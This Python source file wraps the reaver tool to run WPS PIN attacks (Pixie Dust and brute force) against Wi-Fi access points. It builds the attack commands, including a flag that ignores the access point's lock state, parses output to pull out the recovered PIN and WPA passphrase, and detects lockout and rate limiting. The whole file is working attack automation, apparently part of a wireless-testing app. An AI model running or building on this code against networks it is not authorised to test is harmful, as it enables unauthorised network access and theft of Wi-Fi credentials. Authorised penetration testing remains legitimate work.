import re
from collections.abc import AsyncIterator
from dataclasses import dataclass, field
from enum import Enum

from app.tools.base import AsyncToolWrapper


class WPSStatus(Enum):
    """Status indicators detected during WPS attack."""
    RUNNING = "running"
    SUCCESS = "success"
    LOCKED = "locked"
    RATE_LIMITED = "rate_limited"
    TIMEOUT = "timeout"
    FAILED = "failed"


@dataclass
class WPSProgress:
    """Progress information from a WPS attack."""
    pins_tried: int = 0
    current_pin: str | None = None
    percentage: float = 0.0
    status: WPSStatus = WPSStatus.RUNNING
    warnings: list[str] = field(default_factory=list)


# Patterns for detecting WPS attack status
RATE_LIMIT_PATTERNS = [
    r"WARNING.*rate\s*limit",
    r"WARNING.*too\s*many",
    r"receive\s+timeout",
    r"failed\s+to\s+receive",
    r"no\s+response\s+from",
    r"waiting\s+for\s+the\s+AP\s+to\s+reset",
]

LOCKED_PATTERNS = [
    r"WPS\s+locked",
    r"AP\s+has\s+been\s+locked",
    r"WARNING.*locked",
    r"WPS\s+state\s*:\s*locked",
]

SUCCESS_PATTERNS = [
    r"\[\+\]\s+WPA\s+PSK:",
    r"\[\+\]\s+Pin\s+found:",
    r"\[\+\]\s+WPS\s+PIN:",
]

PROGRESS_PATTERN = re.compile(r"Trying\s+pin\s+(\d+)", re.IGNORECASE)
PERCENTAGE_PATTERN = re.compile(r"(\d+(?:\.\d+)?)\s*%\s*complete", re.IGNORECASE)


class ReaverTool(AsyncToolWrapper):
    """Wrapper for reaver — WPS PIN attacks (Pixie Dust & brute force)."""

    binary = "reaver"
    default_timeout = 300  # 5 minutes for WPS attacks

    async def pixie_dust(
        self,
        interface: str,
        bssid: str,
        channel: int,
        timeout: int | None = None,
    ) -> AsyncIterator[str]:
        """Perform a Pixie Dust attack (-K flag).

        Yields output lines; look for ``[+] WPA PSK:`` or ``[+] Pin found:``
        to detect success.

        Args:
            interface: Monitor-mode interface.
            bssid: Target AP MAC.
            channel: AP channel.
            timeout: Optional timeout in seconds.
        """
        args = [
            "-i", interface,
            "-b", bssid,
            "-c", str(channel),
            "-K",    # Pixie Dust
            "-vv",   # verbose
        ]
        async for line in self.stream(args, merge_stderr=True, timeout=timeout or 120):
            yield line

    async def bruteforce(
        self,
        interface: str,
        bssid: str,
        channel: int,
        delay: int = 2,
        timeout: int | None = None,
    ) -> AsyncIterator[str]:
        """Perform a WPS PIN brute-force attack.

        Args:
            interface: Monitor-mode interface.
            bssid: Target AP MAC.
            channel: AP channel.
            delay: Seconds between PIN attempts (-d flag).
            timeout: Optional timeout in seconds.
        """
        args = [
            "-i", interface,
            "-b", bssid,
            "-c", str(channel),
            "-vv",
            "-d", str(delay),
            "-L",    # ignore locked state
            "-N",    # no-nacks
        ]
        async for line in self.stream(args, merge_stderr=True, timeout=timeout):
            yield line

    def parse_result(self, output: str) -> dict | None:
        """Extract PIN and PSK from reaver output.

        Returns:
            Dict with ``pin`` and ``psk`` keys, or None if not found.
        """
        pin_match = re.search(r"\[\+\]\s+(?:Pin found|WPS PIN):\s*(\d+)", output, re.IGNORECASE)
        psk_match = re.search(r"\[\+\]\s+WPA PSK:\s*(.+)", output, re.IGNORECASE)

        if psk_match:
            return {
                "pin": pin_match.group(1) if pin_match else None,
                "psk": psk_match.group(1).strip(),
            }
        return None

    def detect_status(self, line: str) -> WPSStatus | None:
        """Detect status from a single output line.

        Returns:
            WPSStatus if a status indicator is detected, None otherwise.
        """
        line_lower = line.lower()

        # Check for success
        for pattern in SUCCESS_PATTERNS:
            if re.search(pattern, line, re.IGNORECASE):
                return WPSStatus.SUCCESS

        # Check for locked AP
        for pattern in LOCKED_PATTERNS:
            if re.search(pattern, line, re.IGNORECASE):
                return WPSStatus.LOCKED

        # Check for rate limiting
        for pattern in RATE_LIMIT_PATTERNS:
            if re.search(pattern, line, re.IGNORECASE):
                return WPSStatus.RATE_LIMITED

        return None

    def parse_progress(self, line: str) -> WPSProgress | None:
        """Parse progress information from output line.

        Returns:
            WPSProgress if progress info is found, None otherwise.
        """
        progress = WPSProgress()

        # Extract current PIN being tried
        pin_match = PROGRESS_PATTERN.search(line)
        if pin_match:
            progress.current_pin = pin_match.group(1)

        # Extract percentage
        pct_match = PERCENTAGE_PATTERN.search(line)
        if pct_match:
            progress.percentage = float(pct_match.group(1))

        # Detect status
        status = self.detect_status(line)
        if status:
            progress.status = status

        if progress.current_pin or progress.percentage or status:
            return progress
        return None

    def is_rate_limited(self, output: str) -> bool:
        """Check if output indicates rate limiting.

        Args:
            output: Full or partial reaver output.

        Returns:
            True if rate limiting is detected.
        """
        for pattern in RATE_LIMIT_PATTERNS:
            if re.search(pattern, output, re.IGNORECASE):
                return True
        return False

    def is_locked(self, output: str) -> bool:
        """Check if output indicates AP is WPS-locked.

        Args:
            output: Full or partial reaver output.

        Returns:
            True if WPS lock is detected.
        """
        for pattern in LOCKED_PATTERNS:
            if re.search(pattern, output, re.IGNORECASE):
                return True
        return False
